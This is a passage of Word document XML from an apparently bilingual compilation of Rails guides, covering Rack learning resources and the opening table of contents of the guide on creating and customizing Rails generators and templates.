              </w:rPr>
              <w:t>run ActionController::Dispatcher.new</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="60D20D1B" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="2"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>4 资源</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="754D9D72"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4.1 学习 Rack</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D9E1A0C" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="008938C9" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="242"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId1124" w:history="1">
        <w:r w:rsidR="004E5E0B" w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Rack 官方网站</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="755A0D1B" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="008938C9" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="242"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId1125" w:history="1">
        <w:r w:rsidR="004E5E0B" w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Rack 简介</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="1AB5C158" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="008938C9" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="242"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId1126" w:history="1">
        <w:r w:rsidR="004E5E0B" w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Ruby on Rack #1 – Hello Rack!</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="49C6FC40" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="008938C9" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="242"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId1127" w:history="1">
        <w:r w:rsidR="004E5E0B" w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Ruby on Rack #2 – The Builder</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="71C7EE53" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="3"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>4.2 理解中间件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E0EE682" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="008938C9" w:rsidP="004E5E0B">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="243"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId1128" w:history="1">
        <w:r w:rsidR="004E5E0B" w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Rack 中间件的 Railscast</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="3CADC28C" w14:textId="422DCDB8" w:rsidR="00185CB6" w:rsidRDefault="002B5D47" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>6.3、</w:t>
      </w:r>
      <w:r w:rsidR="00185CB6">
        <w:t>Creating and Customizing Rails Generators &amp; Templates</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="710D4CF9" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Rails generators are an essential tool if you plan to improve your workflow. With this guide you will learn how to create generators and customize existing ones.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="264EDDAD" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>In this guide you will:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A9AFB02" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="367"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>Learn how to see which generators are available in your application</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="669C484D" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="367"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>Create a generator using templates</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="148EA43E" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="367"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>Learn how Rails searches for generators before invoking them</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F3F9213" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="367"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>Customize your scaffold by creating new generators</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04D3BB8C" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="367"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>Customize your scaffold by changing generator templates</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49CE98C4" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="367"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>Learn how to use fallbacks to avoid overwriting a huge set of generators</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15C765CE" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="367"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>Learn how to create an application template</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D995812" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>目录</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1ED461EA" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="008938C9" w:rsidP="00185CB6">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="368"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId1129" w:anchor="1" w:history="1">
        <w:r w:rsidR="00185CB6">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>First Contact</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="54BD0A66" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="008938C9" w:rsidP="00185CB6">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="368"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId1130" w:anchor="2" w:history="1">
        <w:r w:rsidR="00185CB6">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Creating Your First Generator</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="7344D453" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="008938C9" w:rsidP="00185CB6">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="368"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId1131" w:anchor="3" w:history="1">
        <w:r w:rsidR="00185CB6">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Creating Generators with Generators</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="32927C39" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="008938C9" w:rsidP="00185CB6">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="368"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId1132" w:anchor="4" w:history="1">
        <w:r w:rsidR="00185CB6">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Generators Lookup</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="38B46B27" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="008938C9" w:rsidP="00185CB6">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="368"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId1133" w:anchor="5" w:history="1">
        <w:r w:rsidR="00185CB6">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Customizing Your Workflow</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="7C7F85D7" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="008938C9" w:rsidP="00185CB6">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="368"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId1134" w:anchor="6" w:history="1">
        <w:r w:rsidR="00185CB6">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Customizing Your Workflow by Changing Generators Templates</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="433E7EAB" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="008938C9" w:rsidP="00185CB6">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="368"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId1135" w:anchor="7" w:history="1">
        <w:r w:rsidR="00185CB6">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Adding Generators Fallbacks</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="4F8E3FCF" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="008938C9" w:rsidP="00185CB6">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="368"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId1136" w:anchor="8" w:history="1">
        <w:r w:rsidR="00185CB6">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Application Templates</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="1F32D24D" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="008938C9" w:rsidP="00185CB6">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="368"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId1137" w:anchor="9" w:history="1">
        <w:r w:rsidR="00185CB6">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Generator methods</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="7BBA8F3D" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="008938C9" w:rsidP="00185CB6">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="368"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId1138" w:anchor="9-1" w:history="1">
        <w:r w:rsidR="00185CB6">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>gem</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="3F160B00" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="008938C9" w:rsidP="00185CB6">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="368"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId1139" w:anchor="9-2" w:history="1">
        <w:r w:rsidR="00185CB6">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>gem_group</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="4BB0D1F2" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="008938C9" w:rsidP="00185CB6">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="368"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId1140" w:anchor="9-3" w:history="1">
        <w:r w:rsidR="00185CB6">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>add_source</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="59730DAD" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="008938C9" w:rsidP="00185CB6">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="368"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId1141" w:anchor="9-4" w:history="1">
        <w:r w:rsidR="00185CB6">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>application</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="2DE07ABE" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="008938C9" w:rsidP="00185CB6">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="368"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId1142" w:anchor="9-5" w:history="1">
        <w:r w:rsidR="00185CB6">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>git</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="17D19D26" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="008938C9" w:rsidP="00185CB6">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="368"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId1143" w:anchor="9-6" w:history="1">
        <w:r w:rsidR="00185CB6">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>vendor</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="5F867147" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="008938C9" w:rsidP="00185CB6">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="368"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId1144" w:anchor="9-7" w:history="1">
        <w:r w:rsidR="00185CB6">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>lib</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="43B48CA8" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="008938C9" w:rsidP="00185CB6">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="368"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId1145" w:anchor="9-8" w:history="1">
        <w:r w:rsidR="00185CB6">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>rakefile</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0084D709" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="008938C9" w:rsidP="00185CB6">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="368"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId1146" w:anchor="9-9" w:history="1">
        <w:r w:rsidR="00185CB6">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>initializer</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="033A2B1F" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="008938C9" w:rsidP="00185CB6">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="368"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId1147" w:anchor="9-10" w:history="1">
        <w:r w:rsidR="00185CB6">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>generate</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="6994F63D" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="008938C9" w:rsidP="00185CB6">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="368"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId1148" w:anchor="9-11" w:history="1">
        <w:r w:rsidR="00185CB6">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>rake</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="12B76D6C" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="008938C9" w:rsidP="00185CB6">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="368"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId1149" w:anchor="9-12" w:history="1">
        <w:r w:rsidR="00185CB6">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>capify!</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="21ED78A4" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="008938C9" w:rsidP="00185CB6">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="368"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId1150" w:anchor="9-13" w:history="1">
        <w:r w:rsidR="00185CB6">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>route</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="2E39EC18" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="008938C9" w:rsidP="00185CB6">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="368"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
